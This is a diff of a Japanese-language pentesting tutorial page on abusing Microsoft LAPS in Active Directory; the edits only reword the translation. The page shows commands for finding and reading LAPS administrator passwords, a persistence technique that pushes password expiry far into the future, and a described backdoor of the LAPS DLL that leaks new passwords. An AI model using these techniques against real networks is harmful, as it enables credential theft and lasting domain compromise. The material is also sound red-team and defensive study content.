@@ -22,11 +22,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## 基本情報
 
-Local Administrator Password Solution (LAPS) は、**管理者パスワード**を管理するためのツールであり、これらのパスワードは**ユニークでランダム化され、頻繁に変更されます**。これらはドメインに参加しているコンピュータに適用されます。これらのパスワードはActive Directory内に安全に保存され、アクセス制御リスト（ACL）を通じて権限が付与されたユーザーのみがアクセスできます。クライアントからサーバーへのパスワードの送信のセキュリティは、**Kerberosバージョン5**と**高度な暗号化標準（AES）**の使用によって確保されています。
+Local Administrator Password Solution (LAPS) は、**管理者パスワード**を管理するためのツールであり、これらのパスワードは**ユニークでランダム化され、頻繁に変更される**もので、ドメインに参加しているコンピュータに適用されます。これらのパスワードはActive Directory内に安全に保存され、アクセス制御リスト（ACL）を通じて許可を与えられたユーザーのみがアクセスできます。クライアントからサーバーへのパスワード送信のセキュリティは、**Kerberosバージョン5**と**高度な暗号化標準（AES）**の使用によって確保されています。
 
-ドメインのコンピュータオブジェクトにおいて、LAPSの実装により、2つの新しい属性が追加されます：**`ms-mcs-AdmPwd`**と**`ms-mcs-AdmPwdExpirationTime`**。これらの属性はそれぞれ、**平文の管理者パスワード**と**その有効期限**を保存します。
+ドメインのコンピュータオブジェクトにおいて、LAPSの実装により、2つの新しい属性が追加されます：**`ms-mcs-AdmPwd`**と**`ms-mcs-AdmPwdExpirationTime`**。これらの属性は、それぞれ**平文の管理者パスワード**と**その有効期限**を保存します。
 
-### 有効かどうかを確認する
+### 有効化されているか確認する
 ```bash
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
 
@@ -41,7 +41,7 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS パスワードアクセス
 
-`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **生の LAPS ポリシーをダウンロード** し、次に [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージの **`Parse-PolFile`** を使用して、このファイルを人間が読みやすい形式に変換できます。
+`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **生の LAPS ポリシーをダウンロード** し、その後 [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージの **`Parse-PolFile`** を使用して、このファイルを人間が読みやすい形式に変換できます。
 
 さらに、**ネイティブ LAPS PowerShell cmdlets** は、アクセスできるマシンにインストールされている場合に使用できます:
 ```powershell
@@ -76,7 +76,7 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 
 [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) は、いくつかの機能を使って LAPS の列挙を容易にします。\
 その一つは、**LAPS が有効なすべてのコンピュータ**のために **`ExtendedRights`** を解析することです。これにより、**LAPS パスワードを読み取るために特に委任されたグループ**が表示されます。これらはしばしば保護されたグループのユーザーです。\
-**ドメインにコンピュータを参加させたアカウント**は、そのホストに対して `All Extended Rights` を受け取り、この権利により **パスワードを読み取る**能力が与えられます。列挙により、ホスト上で LAPS パスワードを読み取ることができるユーザーアカウントが表示されることがあります。これにより、LAPS パスワードを読み取ることができる特定の AD ユーザーを **ターゲットにする**のに役立ちます。
+**ドメインにコンピュータを参加させたアカウント**は、そのホストに対して `All Extended Rights` を受け取り、この権利により **パスワードを読み取る**能力が与えられます。列挙により、ホスト上で LAPS パスワードを読み取ることができるユーザーアカウントが表示されることがあります。これにより、LAPS パスワードを読み取ることができる特定の AD ユーザーを**ターゲットにする**のに役立ちます。
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -117,7 +117,7 @@ Password: 2Z@Ae)7!{9#Cq
 ```
 ## **LAPS Persistence**
 
-### **有効期限**
+### **Expiration Date**
 
 一度管理者になると、**パスワードを取得**し、**有効期限を未来に設定することによって**マシンが**パスワードを更新するのを防ぐ**ことが可能です。
 ```powershell
@@ -129,14 +129,14 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 {% hint style="warning" %}
-パスワードは、**admin**が**`Reset-AdmPwdPassword`** cmdletを使用した場合、またはLAPS GPOで**ポリシーで要求されるよりも長いパスワードの有効期限を許可しない**が有効になっている場合でもリセットされます。
+パスワードは、**admin**が**`Reset-AdmPwdPassword`**コマンドレットを使用した場合、またはLAPS GPOで**パスワードの有効期限をポリシーで要求されるよりも長く設定しない**が有効になっている場合でもリセットされます。
 {% endhint %}
 
 ### バックドア
 
 LAPSの元のソースコードは[こちら](https://github.com/GreyCorbel/admpwd)にあります。したがって、コードにバックドアを仕込むことが可能です（例えば、`Main/AdmPwd.PS/Main.cs`の`Get-AdmPwdPassword`メソッド内）で、新しいパスワードを**外部に流出させるか、どこかに保存する**ことができます。
 
-その後、新しい`AdmPwd.PS.dll`をコンパイルし、`C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`にアップロードします（そして、修正時間を変更します）。
+その後、新しい`AdmPwd.PS.dll`をコンパイルして、`C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll`にアップロードします（そして、修正時間を変更します）。
 
 ## 参考文献
 * [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
